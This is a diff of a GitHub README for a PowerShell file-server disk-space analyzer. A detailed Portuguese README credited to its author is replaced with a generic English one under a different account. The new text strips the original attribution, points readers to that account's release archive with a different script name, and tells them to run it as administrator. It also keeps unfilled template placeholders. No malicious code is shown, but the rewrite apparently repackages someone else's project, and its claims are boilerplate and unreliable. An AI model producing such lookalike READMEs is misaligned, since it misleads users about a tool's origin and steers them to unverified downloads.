@@ -1,317 +1,142 @@
-# 🗂️ File Server Space Analyzer - PowerShell
+# PowerShell File Server Space Analyzer: Optimize Your Storage Efficiently
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Mathews_Buzetti-blue)](https://www.linkedin.com/in/mathewsbuzetti)
-![PowerShell](https://img.shields.io/badge/PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white)
-![Status](https://img.shields.io/badge/Status-Production-green?style=flat-square)
-![Security](https://img.shields.io/badge/Security-100%25%20Read--Only-brightgreen?style=flat-square)
+![GitHub release](https://img.shields.io/github/release/Jumpin-Jay/powershell-file-server-space-analyzer.svg) ![License](https://img.shields.io/badge/license-MIT-blue.svg)
 
-**Aplica-se a:** ✔️ Windows Server 2016/2019/2022 ✔️ File Servers ✔️ Network Shares ✔️ Local Storage
+## Overview
 
-## 📋 Metadados
+The **PowerShell File Server Space Analyzer** is a robust script designed for analyzing disk space on file servers. It identifies duplicate files, large files, and old files, providing an interactive HTML dashboard for easy visualization. This tool helps in optimizing storage, ensuring that your file server runs efficiently.
 
-| Metadado | Descrição |
-|----------|-----------|
-| **Título** | File Server Space Analyzer - Otimização de Armazenamento |
-| **Versão** | 2.3 |
-| **Data** | 24/06/2025 |
-| **Autor** | Mathews Buzetti |
-| **Tags** | `powershell`, `file-server`, `space-analysis`, `deduplication`, `html-report`, `storage-optimization` |
-| **Status** | ✅ Aprovado para ambiente de produção |
+## Features
 
-## 📷 Visualização do Relatório Interativo
+- **Duplicate File Detection**: Quickly find and manage duplicate files to free up space.
+- **Large and Old File Identification**: Spot large and outdated files that may be taking up unnecessary space.
+- **Interactive HTML Dashboard**: Visualize your storage usage through an easy-to-navigate dashboard.
+- **NTFS Support**: Fully compatible with NTFS file systems.
+- **Read-Only Operation**: Safely analyze without modifying any files.
+- **Sanitization Options**: Ensure sensitive data is handled appropriately.
 
-A ferramenta gera um dashboard HTML interativo moderno que facilita a visualização e análise de problemas de espaço em servidores de arquivos. O relatório inclui gráficos avançados, métricas em tempo real e uma interface responsiva para análise completa.
+## Topics
 
-<p align="center">
-  <strong>👇 Clique no botão abaixo para visualizar um exemplo de dashboard de análise de espaço 👇</strong>
-  <br><br>
-  <a href="https://mathewsbuzetti.github.io/powershell-file-server-space-analyzer/" target="_blank">
-    <img src="https://img.shields.io/badge/Acessar%20Demo-Dashboard:%20Análise%20de%20Espaço-brightgreen?style=for-the-badge&logo=html5" alt="Acessar Demo" width="400">
-  </a>
-  <br>
-  <em>O demo mostra todas as funcionalidades do dashboard, incluindo métricas de recuperação, gráficos interativos e recomendações priorizadas</em>
-</p>
+This project covers various topics that enhance your file server management:
 
-![image](https://github.com/user-attachments/assets/cdc429e3-8e11-41db-bb7d-4755bc1b8061)
+- Cleanup
+- Dashboard
+- Deduplication
+- Duplicate Files
+- File Server
+- HTML Report
+- NTFS
+- PowerShell Script
+- Read-Only
+- Sanitization
+- Space Analysis
+- Storage Optimization
+- Windows Server
 
-![image](https://github.com/user-attachments/assets/444f5aa0-097d-40fd-9722-08f84b268677)
+## Getting Started
 
-![image](https://github.com/user-attachments/assets/fe43d60e-34df-4b33-b3f7-c8fee4d5aecd)
+To get started with the **PowerShell File Server Space Analyzer**, you need to download the latest release. You can find it [here](https://github.com/Jumpin-Jay/powershell-file-server-space-analyzer/releases). After downloading, follow the instructions below to execute the script.
 
-![image](https://github.com/user-attachments/assets/683bec98-4712-4411-bda3-14c2172c04b1)
+### Prerequisites
 
-![image](https://github.com/user-attachments/assets/e9857c3b-cbf1-487c-b7b7-2e117000c8a7)
+Ensure you have the following before running the script:
 
-![image](https://github.com/user-attachments/assets/a2b21ced-0270-4081-a2ce-62b969895b5b)
+- Windows Server with PowerShell installed.
+- Administrative privileges to access file directories.
+- Basic understanding of PowerShell commands.
 
-![image](https://github.com/user-attachments/assets/54bea6b8-8dc8-4e90-a85d-64287f0a9be0)
+### Installation
 
-![image](https://github.com/user-attachments/assets/d5ca92e5-cf02-42e4-9694-e31f60c95f00)
-
-
-## 📋 Índice
-
-1. [Metadados](#-metadados)
-2. [Visualização do Relatório Interativo](#-visualização-do-relatório-interativo)
-3. [Garantia de Segurança](#-garantia-de-segurança)
-4. [Funcionalidades](#-funcionalidades)
-5. [Pré-requisitos](#-pré-requisitos)
-6. [Como Usar](#-como-usar)
-7. [Resultados e Relatórios](#-resultados-e-relatórios)
-8. [Configurações Avançadas](#-configurações-avançadas)
-9. [Windows Deduplication](#-windows-deduplication)
-10. [Interpretando os Resultados](#-interpretando-os-resultados)
-11. [Segurança e Boas Práticas](#-segurança-e-boas-práticas)
-12. [Limitações e Considerações](#-limitações-e-considerações)
-13. [Versionamento](#-versionamento)
-14. [Suporte e Contato](#-suporte-e-contato)
-
-## 🔒 Garantia de Segurança
-
-> ### ⚠️ **SCRIPT 100% READ-ONLY - MÁXIMA SEGURANÇA**
-> - ✅ **NUNCA remove arquivos dos usuários**
-> - ✅ **NUNCA modifica dados existentes**  
-> - ✅ **Apenas cria relatórios de análise**
-> - ✅ **Script é 100% somente leitura**
-
-## 💻 Funcionalidades
-
-### 🎯 Recursos Principais v2.3
-* **Análise de Duplicados**: Detecção precisa usando hash MD5 com agrupamento inteligente
-* **Grandes OU Antigos**: Critério OR com badges por impacto (Grande + Antigo > Grande > Antigo)
-* **Arquivos Temporários**: Identificação e análise de arquivos desnecessários (.tmp, .bak, .log, etc)
-* **Windows Deduplication**: Detecção automática e ajuste de valores para espaço físico real
-* **Dashboard HTML Interativo**: Relatório visual com gráficos, métricas e recomendações
-* **Tratamento Robusto de Erros**: Análise continua mesmo com problemas de acesso
-* **Otimização de Performance**: Processamento em lotes para grandes volumes de dados
-
-### 🔍 Análises Avançadas
-* Cálculo preciso de potencial de recuperação sem arredondamento duplo
-* Detecção de sobreposições entre categorias para evitar dupla contagem
-* Suporte a caminhos de rede e locais
-* Análise de eficiência da deduplicação ativa
-* Exportação completa para CSV com dados detalhados
-
-### 📈 Dashboard HTML Moderno
-* **Métricas de Resumo**: Contadores com animação e indicadores visuais
-* **Gráficos Interativos**: Pizza donut com breakdown por categoria
-* **Visualizações**: Top 5 tipos de arquivo com gráfico de barras animado
-* **Tabelas Responsivas**: Interface com abas e conteúdo colapsível
-* **Badges de Prioridade**: Sistema visual de classificação por impacto
-* **Modo Responsivo**: Funciona perfeitamente em desktop, tablet e mobile
-
-## 📋 Pré-requisitos
-
-* Windows 10/11 ou Windows Server 2016/2019/2022
-* PowerShell 5.1 ou superior
-* Permissões de leitura nos diretórios a serem analisados
-* Espaço livre em C:\temp (ou pasta configurada) para relatórios
-* Navegador moderno para visualizar o dashboard HTML (Chrome, Edge, Firefox)
-
-> [!WARNING]\
-> **Requisitos de segurança e performance:**
-> - Execute como administrador para máxima cobertura de análise
-> - Tenha pelo menos 2GB de RAM livre para análise de servidores grandes
-> - Reserve 500MB de espaço livre para geração de relatórios
-> - Considere executar fora do horário comercial em servidores em produção
-> - O script é 100% read-only, mas pode impactar temporariamente a performance do servidor
-
-> [!NOTE]\
-> **Compatibilidade testada:**
-> - Windows Server 2016/2019/2022 (Recomendado)
-> - PowerShell 5.1, 7.x
-> - Compartilhamentos SMB/CIFS
-> - Volumes NTFS locais e de rede
-
-## 🚀 Como Usar
-
-1. **Download do Script**:
-   
-   [![Download Script](https://img.shields.io/badge/Download%20Script-FileServerSpaceAnalyzer.ps1-blue?style=flat-square&logo=powershell)](https://github.com/mathewsbuzetti/powershell-file-server-space-analyzer/blob/main/Script/FileServerSpaceAnalyzer.ps1)
-
-2. **Abra o script no PowerShell ISE**.
-
-3. **Localize as linhas abaixo no início do script e altere conforme necessário**:
+1. **Download the Script**: Go to the [Releases section](https://github.com/Jumpin-Jay/powershell-file-server-space-analyzer/releases) and download the latest version of the script.
+2. **Extract the Files**: Unzip the downloaded file to a folder of your choice.
+3. **Open PowerShell**: Right-click on the Start menu and select "Windows PowerShell (Admin)".
+4. **Navigate to the Script Location**: Use the `cd` command to change the directory to where you extracted the files.
 
    ```powershell
-   # Configurações principais (edite no início do script)
-   $TamanhoMinimoArquivosMB = 500          # Tamanho mínimo para "grandes"
-   $DiasArquivosAntigos = 90               # Idade mínima para "antigos"
-   $TopArquivosGrandesAntigos = 1000       # Quantidade máxima a analisar
-   $TamanhoMinimoArquivosDuplicadosMB = 50 # Tamanho mínimo para duplicados
-   $TopGruposDuplicados = 2000             # Top grupos de duplicados
-   $ModoSilencioso = $true                 # Reduz verbosidade
+   cd "C:\path\to\your\script\folder"
    ```
 
-> [!WARNING]\
-> **Configurações avançadas e seus impactos:**
-> - **TamanhoMinimoArquivosMB**: Define o tamanho mínimo para considerar arquivos como "grandes". Valores menores (100MB) incluem mais arquivos na análise, mas aumentam significativamente o tempo de execução em servidores com muitos arquivos.
-> - **DiasArquivosAntigos**: Define quantos dias para considerar arquivos como "antigos". Valores menores (30 dias) incluem mais arquivos recentes, enquanto valores maiores (180 dias) focam apenas em arquivos realmente antigos.
-> - **TopArquivosGrandesAntigos**: Limita quantos arquivos grandes/antigos serão analisados. Valores maiores (5000) fornecem análise mais completa, mas consomem mais memória e tempo de processamento.
-> - **TamanhoMinimoArquivosDuplicadosMB**: Define o tamanho mínimo para buscar duplicados. Valores menores (10MB) encontram mais duplicados, mas o cálculo de hash MD5 demora muito mais tempo.
-> - **TopGruposDuplicados**: Limita quantos grupos de duplicados serão processados. Aumentar (5000+) pode melhorar a detecção, mas aumenta significativamente o uso de memória e tempo de processamento.
-> - **ModoSilencioso**: Quando false, exibe logs detalhados no console. Útil para debug, mas pode gerar muito output em análises grandes.
+5. **Run the Script**: Execute the script with the following command:
 
-4. **Após a alteração, execute o script pressionando F5 ou o botão Play no PowerShell ISE**.
+   ```powershell
+   .\SpaceAnalyzer.ps1
+   ```
 
-5. **Configuração Interativa**:
-   - Escolha entre análise local ou de rede
-   - Digite o caminho a ser analisado
-   - Aguarde a análise ser concluída
+### Usage
 
-![image](https://github.com/user-attachments/assets/6d898b82-6c1d-4a41-a177-a2fb310b43c4)
+Once the script runs, it will analyze your file server and generate a detailed HTML report. The report will display:
 
-## 📊 Resultados e Relatórios
+- Total disk space used
+- Number of duplicate files
+- List of large files
+- List of old files
+- Interactive charts and graphs for better understanding
 
-### Dashboard HTML Interativo
-O relatório principal é um dashboard HTML moderno que inclui:
+## Dashboard Overview
 
-1. **Hero Section**: Métricas principais com animações
-2. **Cards de Resumo**: Estatísticas visuais por categoria
-3. **Gráficos**: 
-   - Pizza donut para composição da recuperação
-   - Barras para top 5 tipos de arquivo
-4. **Seções Detalhadas**:
-   - Visão geral com progress bars
-   - Abas para tipos, duplicados, grandes/antigos
-   - Seção de erros v2.3 com estatísticas
-5. **Recomendações**: Plano de ação priorizado
-6. **Design Responsivo**: Funciona em qualquer dispositivo
+The HTML dashboard provides a user-friendly interface to visualize the data collected during the analysis. Key components include:
 
-### Arquivos Gerados
-```
-C:\temp\AnaliseFileServer_YYYY-MM-DD_HHMMSS\
-├── RelatorioSanitizacao.html           # Dashboard principal
-├── DistribuicaoTipos.csv               # Análise por tipo de arquivo
-├── ArquivosDuplicados.csv              # Lista completa de duplicados
-├── GrandesAntigos.csv                  # Arquivos grandes OU antigos
-├── ArquivosTemporarios.csv             # Arquivos temporários encontrados
-├── ErrosPermissao.csv                  # Erros de acesso (se houver)
-├── CaminhosMuitoLongos.csv             # Caminhos problemáticos
-└── ResumoErros.txt                     # Resumo de problemas encontrados
-```
+- **Storage Usage Pie Chart**: Shows the proportion of space used by different file types.
+- **Duplicate Files Table**: Lists all duplicates found, allowing for easy management.
+- **Large Files List**: Displays files that exceed a specified size threshold.
+- **Old Files List**: Identifies files that have not been modified in a long time.
 
-## 🔧 Configurações Avançadas
+### Example Dashboard
 
-### Performance e Otimização
-```powershell
-# Para servidores grandes (10TB)
-$MaxErrosPorTipo = 100                  # Aumentar limite de erros
-$TopGruposDuplicados = 5000             # Mais grupos de duplicados
+![Dashboard Example](https://example.com/dashboard.png)
 
-# Para análise rápida
-$TamanhoMinimoArquivosMB = 1000         # Focar apenas em arquivos muito grandes
-$TopArquivosGrandesAntigos = 500        # Reduzir quantidade analisada
-```
+*Note: Replace with an actual image link relevant to the project.*
 
-### Tratamento de Erros
-O script v2.3 inclui tratamento robusto para:
-- ❌ Erros de permissão de acesso
-- 📏 Caminhos muito longos (240 caracteres)
-- 🔒 Arquivos e pastas protegidos pelo sistema
-- 🌐 Problemas de conectividade de rede
-- 💾 Limitações de memória em análises grandes
+## Customization
 
-## 💡 Windows Deduplication
+You can customize the script to suit your needs. Here are a few parameters you might want to adjust:
 
-### Detecção Automática
-O script detecta automaticamente se a Windows Deduplication está ativa e ajusta os cálculos:
+- **File Size Threshold**: Change the size limit for large files.
+- **Date Threshold**: Modify the date to filter old files.
+- **Output Directory**: Specify where to save the HTML report.
 
-- **Taxa de Compressão**: Mostra a eficiência atual
-- **Valores Ajustados**: Espaço físico real que será liberado
-- **Recomendações**: Sugere habilitação se não estiver ativa
+To customize, open the script in a text editor and look for the configuration section.
 
-### Benefícios da Deduplication
-- 10-80% de economia de espaço adicional
-- Especialmente eficaz em servidores com dados duplicados
-- Redução do backup e replicação
+## Troubleshooting
 
-## 📈 Interpretando os Resultados
+If you encounter issues while running the script, consider the following:
 
-### Priorização por Impacto
-1. **🔴 Crítico**: Arquivos Grande + Antigo (máximo impacto)
-2. **🟠 Alto**: Arquivos apenas Grandes (impacto significativo)
-3. **🟡 Médio**: Arquivos apenas Antigos (menor impacto)
-4. **🔵 Info**: Duplicados e temporários (fácil limpeza)
+- **Permission Errors**: Ensure you have administrative rights.
+- **Path Errors**: Double-check the file paths you provide in the script.
+- **PowerShell Execution Policy**: If the script does not run, you may need to change your execution policy. Run this command in PowerShell:
 
-### Métricas Importantes
-- **Potencial de Recuperação**: Espaço total que pode ser liberado
-- **Percentual do Disco**: Quanto representa do espaço usado
-- **Sobreposições**: Arquivos contados em múltiplas categorias
-- **Deduplicação**: Economia adicional disponível
+   ```powershell
+   Set-ExecutionPolicy RemoteSigned
+   ```
 
-## 🛡️ Segurança e Boas Práticas
+## Contribution
 
-> [!WARNING]\
-> **Importantes considerações de segurança:**
-> - Embora o script seja 100% read-only, a análise intensiva pode impactar a performance do servidor
-> - Execute em horários de baixo uso para minimizar impacto nos usuários
-> - Verifique se há espaço suficiente para os relatórios antes da execução
-> - Não execute em múltiplos servidores simultaneamente sem considerar a carga de rede
-> - Mantenha os relatórios gerados em local seguro pois contêm informações sensíveis sobre a estrutura de arquivos
+Contributions are welcome! If you have suggestions or improvements, please fork the repository and submit a pull request. Make sure to follow the code style and include tests for any new features.
 
-### Durante a Análise
-- O script é 100% read-only - não modifica arquivos
-- Performance pode ser impactada temporariamente
-- Monitorar logs para identificar problemas de acesso
+### How to Contribute
 
-### Após a Análise
-1. 📋 Revisar relatório HTML antes de qualquer ação
-2. 🔍 Validar arquivos duplicados antes da remoção
-3. 📁 Confirmar que arquivos "antigos" podem ser arquivados
-4. 💾 Considerar backup antes de limpeza massiva
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your fork.
+5. Open a pull request against the main repository.
 
-> [!NOTE]\
-> **Dica de segurança:** O relatório HTML contém informações detalhadas sobre a estrutura de arquivos do servidor. Mantenha esses relatórios em local seguro e limite o acesso apenas a administradores autorizados.
+## License
 
-## 🚨 Limitações e Considerações
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-> [!WARNING]\
-> **Limitações importantes do script:**
-> - O cálculo de hash MD5 para duplicados é CPU-intensivo e pode aquecer o servidor
-> - Arquivos em uso exclusivo podem não ser detectados corretamente
-> - Permissões insuficientes podem resultar em análise incompleta
-> - Não recomendado executar durante backup ou outras operações intensivas de I/O
+## Contact
 
-### Performance
-- Análise de servidores grandes (30TB) pode levar várias horas
-- Uso intensivo de CPU durante cálculo de hashes MD5
-- Impacto temporário na performance de rede/disco
+For any questions or issues, please reach out to the repository owner or create an issue in the GitHub repository.
 
-### Precisão
-- Hashes MD5 têm probabilidade mínima de colisão
-- Arquivos em uso podem não ser detectados corretamente
-- Permissões insuficientes podem limitar a análise
+## Download the Latest Release
 
-### Compatibilidade
-- Testado no Windows Server 2016/2019/2022
-- Requer PowerShell 5.1+ para funcionalidades completas
-- Alguns recursos podem variar entre versões do Windows
+To download the latest version of the script, visit the [Releases section](https://github.com/Jumpin-Jay/powershell-file-server-space-analyzer/releases). After downloading, follow the installation instructions provided above to start optimizing your file server space.
 
-## 🔄 Versionamento
+## Conclusion
 
-### Versão 2.3 (Atual)
-- ✅ Script 100% read-only com máxima segurança
-- ✅ Critério OR para grandes OU antigos com badges por impacto
-- ✅ Detecção aprimorada de Windows Deduplication
-- ✅ Dashboard HTML com design moderno e responsivo
-- ✅ Tratamento robusto de erros v2.3
-- ✅ Cálculos matemáticos corrigidos sem arredondamento duplo
-- ✅ Sistema de badges visuais para classificação de prioridade
+The **PowerShell File Server Space Analyzer** is a powerful tool for managing disk space on your file servers. By identifying duplicates, large files, and outdated files, it helps you maintain an organized and efficient storage system. Use the interactive dashboard to visualize your storage usage and make informed decisions about your file management.
 
----
+![PowerShell Logo](https://example.com/powershell_logo.png)
 
-## 📞 Suporte e Contato
-
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Mathews_Buzetti-blue)](https://www.linkedin.com/in/mathewsbuzetti)
-
-Para dúvidas, sugestões ou relato de problemas:
-- 📧 Entre em contato via LinkedIn
-- 🐛 Abra uma issue no GitHub
-- 💡 Contribuições são bem-vindas via Pull Request
-
----
-
-**⚡ Desenvolvido por Mathews Buzetti - Especialista em Infraestrutura e Automação**
-
-*Copyright © 2025 - Licenciado sob MIT com restrições adicionais*
+*Note: Replace with an actual image link relevant to the project.*
